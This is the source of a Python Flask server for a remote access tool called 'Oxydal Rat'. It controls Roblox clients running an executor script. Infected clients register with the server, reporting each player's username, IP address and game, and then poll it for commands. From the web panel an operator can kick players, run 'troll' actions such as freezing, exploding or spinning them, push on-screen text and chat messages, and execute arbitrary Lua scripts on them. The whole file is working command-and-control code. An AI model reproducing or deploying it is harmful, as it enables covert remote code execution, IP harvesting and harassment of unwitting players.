from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet
from datetime import datetime
import json
import os

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}
HISTORY_FILE = "history_log.json"

connected_players = {}
pending_kicks = {}
pending_commands = {}
history_log = []

def load_history():
    global history_log
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r', encoding='utf-8') as f:
                history_log = json.load(f)
        except:
            history_log = []

def save_history():
    try:
        with open(HISTORY_FILE, 'w', encoding='utf-8') as f:
            json.dump(history_log, f, ensure_ascii=False, indent=2)
    except:
        pass

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

def add_history(event_type, username, details=""):
    timestamp = datetime.now().strftime("%H:%M:%S")
    history_log.insert(0, {
        "time": timestamp,
        "type": event_type,
        "username": username,
        "details": details
    })
    if len(history_log) > 100:
        history_log.pop()
    save_history()
    socketio.emit("history_update", {"history": history_log[:50]})

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Oxydal Rat</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh;overflow:hidden;display:flex}
.sidebar{width:250px;background:rgba(10,10,10,0.95);border-right:2px solid #00ffaa;padding:20px;display:flex;flex-direction:column;gap:10px}
.sidebar-btn{padding:15px;background:rgba(30,30,30,0.8);border:2px solid #333;border-radius:12px;color:#fff;font-size:1.1rem;font-weight:600;cursor:pointer;transition:all .3s;text-align:left}
.sidebar-btn:hover{background:rgba(40,40,40,0.9);border-color:#00ffaa}
.sidebar-btn.active{background:linear-gradient(45deg,#00ffaa,#00aa88);border-color:#00ffaa;box-shadow:0 0 20px rgba(0,255,170,0.5)}
.main-content{flex:1;overflow:hidden;display:flex;flex-direction:column}
.header{padding:30px 40px;text-align:center;border-bottom:2px solid #00ffaa}
h1{font-family:Orbitron;font-size:3rem;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:15px}
.stats{font-size:1.5rem;margin-top:10px}
.content-area{flex:1;overflow:hidden;position:relative}
.tab-content{display:none;height:100%;overflow-y:auto;padding:30px 40px}
.tab-content.active{display:block}
.tab-content::-webkit-scrollbar{width:12px}
.tab-content::-webkit-scrollbar-track{background:rgba(0,0,0,0.3);border-radius:10px}
.tab-content::-webkit-scrollbar-thumb{background:linear-gradient(45deg,#00ffaa,#00aa88);border-radius:10px}
.tab-content::-webkit-scrollbar-thumb:hover{background:linear-gradient(45deg,#00ffcc,#00ccaa)}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:15px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:20px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:12px}
.dot{width:12px;height:12px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.4rem;font-weight:600;color:#ffcc00;margin-bottom:8px;word-break:break-word}
.name a{color:#ffcc00;text-decoration:none}
.name a:hover{text-decoration:underline}
.info{font-size:0.85rem;color:#aaa;margin-bottom:15px;line-height:1.4}
.category{font-weight:bold;color:#00ffaa;margin:12px 0 8px;font-size:0.95rem}
button.kick-btn{padding:10px;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:0.8rem;color:white;transition:transform .2s;margin-bottom:6px}
button.kick-btn:hover{transform:scale(1.05)}
button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
.history-item{background:rgba(20,20,20,0.9);padding:15px;border-radius:12px;margin-bottom:12px;border-left:4px solid #00ffaa;transition:all .3s}
.history-item:hover{background:rgba(30,30,30,0.9)}
.history-item.connect{border-color:#00ffaa}
.history-item.disconnect{border-color:#ff3366}
.history-item.action{border-color:#ffcc00}
.history-time{color:#00ffaa;font-weight:bold;font-size:0.9rem;margin-bottom:5px}
.history-user{color:#ffcc00;font-weight:600;font-size:1.1rem;margin-bottom:5px}
.history-details{color:#aaa;font-size:0.9rem}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
.cancel-btn{background:#444;color:white}
.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6)}
.toast.danger{border-color:#ff3366}
</style>
</head>
<body>
<div class="sidebar">
    <div class="sidebar-btn active" onclick="switchTab('players')">👥 Players</div>
    <div class="sidebar-btn" onclick="switchTab('history')">📜 History</div>
</div>

<div class="main-content">
    <div class="header">
        <h1>Oxydal Rat</h1>
        <div class="stats" id="stats">Players online: <b>0</b></div>
    </div>
    
    <div class="content-area">
        <div class="tab-content active" id="players-tab">
            <div class="grid" id="players"></div>
        </div>
        
        <div class="tab-content" id="history-tab">
            <div id="history"></div>
        </div>
    </div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelKick">Cancel</button>
            <button class="confirm-btn" id="confirmKick">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="playSoundModal">
    <div class="modal-content" style="border-left:5px solid orange; box-shadow:0 0 40px rgba(255,165,0,0.7);">
        <h2 style="color:orange;">Play Sound</h2>
        <input type="text" id="soundAssetId" placeholder="Enter Asset ID" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelSound">Cancel</button>
            <button class="confirm-btn" id="confirmSound" style="background:linear-gradient(45deg,orange,#ff9900);">Confirm</button>
        </div>
    </div>
</div>

<div class="modal" id="textScreenModal">
    <div class="modal-content" style="border-left:5px solid #00ffff; box-shadow:0 0 40px rgba(0,255,255,0.7);">
        <h2 style="color:#00ffff;">Display Text Screen</h2>
        <input type="text" id="screenText" placeholder="Enter text to display" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelText">Cancel</button>
            <button class="confirm-btn" id="confirmText" style="background:linear-gradient(45deg,#00ffff,#00aaaa);">Display</button>
        </div>
    </div>
</div>

<div class="modal" id="sendMessageModal">
    <div class="modal-content" style="border-left:5px solid #ffaa00; box-shadow:0 0 40px rgba(255,170,0,0.7);">
        <h2 style="color:#ffaa00;">Send Chat Message</h2>
        <input type="text" id="chatMessage" placeholder="Enter message to send" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelMessage">Cancel</button>
            <button class="confirm-btn" id="confirmMessage" style="background:linear-gradient(45deg,#ffaa00,#ff8800);">Send</button>
        </div>
    </div>
</div>

<div class="modal" id="luaExecModal">
    <div class="modal-content" style="border-left:5px solid #ff00ff; box-shadow:0 0 40px rgba(255,0,255,0.7);">
        <h2 style="color:#ff00ff;">Execute Lua Script</h2>
        <textarea id="luaScript" placeholder="Enter Lua code to execute" style="width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1rem;margin-bottom:20px;min-height:150px;font-family:monospace;resize:vertical;"></textarea>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelLua">Cancel</button>
            <button class="confirm-btn" id="confirmLua" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);">Execute</button>
        </div>
    </div>
</div>

<div class="modal" id="importFileModal">
    <div class="modal-content" style="border-left:5px solid #00ff00; box-shadow:0 0 40px rgba(0,255,0,0.7);">
        <h2 style="color:#00ff00;">Import Lua File</h2>
        <input type="file" id="luaFileInput" accept=".lua,.txt" style="width:100%;padding:15px;border-radius:12px;border:2px dashed #00ff00;background:#222;color:white;font-size:1rem;margin-bottom:20px;cursor:pointer;">
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelImport">Cancel</button>
            <button class="confirm-btn" id="confirmImport" style="background:linear-gradient(45deg,#00ff00,#00aa00);">Execute File</button>
        </div>
    </div>
</div>

<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId = null;
const kickModal = document.getElementById("kickModal");

function switchTab(tab) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
    document.getElementById(tab + '-tab').classList.add('active');
    event.target.classList.add('active');
}

function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
function closeModal() { kickModal.classList.remove("active"); }
function performKick() {
    if (!currentKickId) return;
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
    toast(`Kick sent`, "danger");
    closeModal();
}

const playSoundModal = document.getElementById("playSoundModal");
let currentSoundId = null;
function openPlaySoundModal(id) {
    currentSoundId = id;
    playSoundModal.classList.add("active");
    document.getElementById("soundAssetId").focus();
}
function closeSoundModal() { playSoundModal.classList.remove("active"); }
function performPlaySound() {
    if (!currentSoundId) return;
    const assetId = document.getElementById("soundAssetId").value.trim();
    if(!assetId) return toast("Enter a valid Asset ID", "danger");
    sendTroll(currentSoundId, "playsound", assetId);
    closeSoundModal();
}

const textScreenModal = document.getElementById("textScreenModal");
let currentTextId = null;
function openTextScreenModal(id) {
    currentTextId = id;
    textScreenModal.classList.add("active");
    document.getElementById("screenText").focus();
}
function closeTextModal() { textScreenModal.classList.remove("active"); }
function performTextScreen() {
    if (!currentTextId) return;
    const text = document.getElementById("screenText").value.trim();
    if(!text) return toast("Enter text to display", "danger");
    sendTroll(currentTextId, "textscreen", text);
    closeTextModal();
}

const sendMessageModal = document.getElementById("sendMessageModal");
let currentMessageId = null;
function openSendMessageModal(id) {
    currentMessageId = id;
    sendMessageModal.classList.add("active");
    document.getElementById("chatMessage").focus();
}
function closeMessageModal() { sendMessageModal.classList.remove("active"); }
function performSendMessage() {
    if (!currentMessageId) return;
    const message = document.getElementById("chatMessage").value.trim();
    if(!message) return toast("Enter a message to send", "danger");
    sendTroll(currentMessageId, "sendmessage", message);
    closeMessageModal();
}

const luaExecModal = document.getElementById("luaExecModal");
let currentLuaId = null;
function openLuaExecModal(id) {
    currentLuaId = id;
    luaExecModal.classList.add("active");
    document.getElementById("luaScript").focus();
}
function closeLuaModal() { luaExecModal.classList.remove("active"); }
function performLuaExec() {
    if (!currentLuaId) return;
    const script = document.getElementById("luaScript").value.trim();
    if(!script) return toast("Enter Lua code to execute", "danger");
    sendTroll(currentLuaId, "luaexec", script);
    closeLuaModal();
}

const importFileModal = document.getElementById("importFileModal");
let currentImportId = null;
function openImportFileModal(id) {
    currentImportId = id;
    importFileModal.classList.add("active");
}
function closeImportModal() { importFileModal.classList.remove("active"); }
function performImportFile() {
    if (!currentImportId) return;
    const fileInput = document.getElementById("luaFileInput");
    const file = fileInput.files[0];
    if(!file) return toast("Select a Lua file to import", "danger");
    
    const reader = new FileReader();
    reader.onload = function(e) {
        const script = e.target.result;
        sendTroll(currentImportId, "luaexec", script);
        closeImportModal();
        fileInput.value = "";
    };
    reader.readAsText(file);
}

function sendTroll(id, cmd, param = null) {
    const body = {userid: id, cmd: cmd};
    if(param) {
        if(cmd === "playsound") body["assetId"] = param;
        else if(cmd === "textscreen") body["text"] = param;
        else if(cmd === "sendmessage") body["message"] = param;
        else if(cmd === "luaexec") body["script"] = param;
    }
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify(body)});
    toast(`${cmd.toUpperCase()} sent`, "danger");
}

document.getElementById("cancelKick").onclick = closeModal;
document.getElementById("confirmKick").onclick = performKick;
kickModal.onclick = (e) => { if (e.target === kickModal) closeModal(); };

document.getElementById("cancelSound").onclick = closeSoundModal;
document.getElementById("confirmSound").onclick = performPlaySound;
playSoundModal.onclick = (e) => { if (e.target === playSoundModal) closeSoundModal(); };

document.getElementById("cancelText").onclick = closeTextModal;
document.getElementById("confirmText").onclick = performTextScreen;
textScreenModal.onclick = (e) => { if (e.target === textScreenModal) closeTextModal(); };

document.getElementById("cancelMessage").onclick = closeMessageModal;
document.getElementById("confirmMessage").onclick = performSendMessage;
sendMessageModal.onclick = (e) => { if (e.target === sendMessageModal) closeMessageModal(); };

document.getElementById("cancelLua").onclick = closeLuaModal;
document.getElementById("confirmLua").onclick = performLuaExec;
luaExecModal.onclick = (e) => { if (e.target === luaExecModal) closeLuaModal(); };

document.getElementById("cancelImport").onclick = closeImportModal;
document.getElementById("confirmImport").onclick = performImportFile;
importFileModal.onclick = (e) => { if (e.target === importFileModal) closeImportModal(); };

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }

        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>
            Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
            JobId: ${p.jobId}</div>
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
                <button class="kick-btn" style="background:orange;" onclick="openPlaySoundModal('${id}')">PLAY SOUND</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="openTextScreenModal('${id}')">TEXT SCREEN</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ffaa00,#ff8800);" onclick="openSendMessageModal('${id}')">SEND MESSAGE</button>
            </div>
            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:6px;">
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','stopsound')">STOP SOUND</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','hidetext')">HIDE TEXT</button>
            </div>
            <div class="category">LUA EXEC</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:6px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ff00,#00aa00);" onclick="openImportFileModal('${id}')">IMPORT FILE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="openLuaExecModal('${id}')">EXECUTOR</button>
            </div>
        `;
    });
    
    document.querySelectorAll('.card').forEach(c => {
        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
    });
}

function renderHistory(data) {
    const historyDiv = document.getElementById("history");
    historyDiv.innerHTML = "";
    
    data.history.forEach(item => {
        const div = document.createElement("div");
        div.className = `history-item ${item.type}`;
        div.innerHTML = `
            <div class="history-time">${item.time}</div>
            <div class="history-user">${item.username}</div>
            <div class="history-details">${item.details}</div>
        `;
        historyDiv.appendChild(div);
    });
}

socket.on("update", render);
socket.on("history_update", renderHistory);
socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));

fetch("/get_history").then(r => r.json()).then(data => renderHistory(data));
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/get_history", methods=["GET"])
def get_history():
    return jsonify({"history": history_log[:50]})

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                username = d.get("username", "Unknown")
                connected_players[uid] = {
                    "username": username,
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                add_history("connect", username, f"Connected from {d.get('game', 'Unknown')}")
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            result = {"command": cmd.get("cmd") if isinstance(cmd, dict) else cmd}
            if isinstance(cmd, dict):
                if "assetId" in cmd:
                    result["assetId"] = cmd["assetId"]
                if "text" in cmd:
                    result["text"] = cmd["text"]
                if "message" in cmd:
                    result["message"] = cmd["message"]
                if "script" in cmd:
                    result["script"] = cmd["script"]
            return jsonify(result)
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    add_history("action", name, f"KICKED: {reason}")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        cmd_data = {"cmd": cmd}
        details = f"{cmd.upper()}"
        
        if "assetId" in data:
            cmd_data["assetId"] = data["assetId"]
            details += f" (Asset: {data['assetId']})"
        elif "text" in data:
            cmd_data["text"] = data["text"]
            details += f" (Text: {data['text']})"
        elif "message" in data:
            cmd_data["message"] = data["message"]
            details += f" (Message: {data['message']})"
        elif "script" in data:
            cmd_data["script"] = data["script"]
            details += f" (Script: {data['script'][:50]}...)"
        
        pending_commands[uid] = cmd_data
        name = connected_players.get(uid, {}).get("username", "Unknown")
        add_history("action", name, details)
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                was_online = p["online"]
                p["online"] = now - p["last"] < 15
                if was_online and not p["online"]:
                    add_history("disconnect", p["username"], "Connection lost")
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            add_history("disconnect", username, "Disconnected")
            socketio.emit("status", {"username": username, "online": False})
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    load_history()
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
